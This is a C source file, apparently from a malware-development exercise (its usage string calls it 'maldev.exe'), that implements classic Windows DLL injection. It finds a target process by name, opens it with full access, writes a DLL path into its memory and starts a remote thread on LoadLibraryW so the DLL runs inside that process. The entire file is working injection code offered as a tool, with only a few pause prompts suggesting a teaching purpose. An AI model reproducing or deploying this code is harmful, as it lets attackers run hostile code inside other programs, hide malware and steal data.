#include <Windows.h>
#include <stdio.h>
#include <Tlhelp32.h>



BOOL GetRemoteProcessHandle(IN LPWSTR szProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess) {

	HANDLE hSnapShot = NULL;

	// Create a snapshot of all processes in the system
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	PROCESSENTRY32	Proc = {
	.dwSize = sizeof(PROCESSENTRY32)
	};

	if (hSnapShot == INVALID_HANDLE_VALUE) {
		printf("[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("created a snapshot using CreateToolhelp32Snapshot\n");

	// Iterate through the snapshot to find the process with the specified name
	while (Process32Next(hSnapShot, &Proc)) {
		if (wcscmp(Proc.szExeFile, szProcessName) == 0) {

			printf("Process \"%ls\" found with PID: %d \n", szProcessName, Proc.th32ProcessID);

			*dwProcessId = Proc.th32ProcessID;
			*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);

			if (*hProcess == NULL) {
				printf("OpenProcess Failed With Error : %d \n", GetLastError());
				CloseHandle(hSnapShot);
				return FALSE;
			}
			CloseHandle(hSnapShot);
			return TRUE; // Process found and handle obtained
		}
	}
	CloseHandle(hSnapShot); // Clean up the snapshot handle
	printf("Process \"%ls\" not found.\n", szProcessName);
	return FALSE; // Process not found
}







BOOL InjectDllToRemoteProcess(IN HANDLE hProcess, IN LPWSTR DllName) {

	BOOL		bSTATE = TRUE;

	LPVOID		pLoadLibraryW = NULL;
	LPVOID		pAddress = NULL;

	// the size of the dll in bytes
	DWORD		dwSizeToWrite = lstrlenW(DllName) * sizeof(WCHAR);

	SIZE_T		lpNumberOfBytesWritten = NULL;

	HANDLE		hThread = NULL;

	pLoadLibraryW = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
	if (pLoadLibraryW == NULL) {
		printf("GetProcAddress Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}
	printf("GetProcAddress done\n");

	pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL) {
		printf("VirtualAllocEx Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	printf("pAddress Allocated At : 0x%p using VirtualAllocEx Of Size : %d\n", pAddress, dwSizeToWrite);
	printf("Press <Enter> To Write ... ");
	getchar();

	if (!WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, &lpNumberOfBytesWritten) || lpNumberOfBytesWritten != dwSizeToWrite) {
		printf("WriteProcessMemory Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	printf("Successfully written %d bytes\n", lpNumberOfBytesWritten);
	printf("Press <Enter> To Run ... ");
	getchar();

	printf("Executing the DLL in the remote process using CreateRemoteThread");
	hThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibraryW, pAddress, NULL, NULL);
	if (hThread == NULL) {
		printf("CreateRemoteThread Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}
	printf("Thread ID: %lu", GetThreadId(hThread));
	printf("DONE !\n");


_EndOfFunction:
	if (hThread)
		CloseHandle(hThread);
	return bSTATE;
}


	int wmain(int argc, wchar_t* argv[]) { // Utilisation de wchar_t 
		if (argc < 3) {
			printf("Usage: maldev.exe <DllPath> <TargetProcessName>\n");
			return -1;
		}
		printf("Injecting the DLL \"%ls\" to the remote process \"%ls\"\n", argv[1], argv[2]);

		HANDLE hProcess = NULL;
		DWORD dwProcessId = 0;

		// get the remote handle of the target process
		if (!GetRemoteProcessHandle(argv[2], &dwProcessId, &hProcess)) {
			printf("[!] Failed to get remote process handle.\n");
			return -1;
		}


		// inject the dll to the remote process using CreateRemoteThread
		if (!InjectDllToRemoteProcess(hProcess, argv[1])) {
			printf("DLL Injection failed.\n");
			CloseHandle(hProcess);
			return -1;
		}

		printf("Done! Press <Enter> to quit");
		getchar();

		CloseHandle(hProcess);
		return 0;
	}

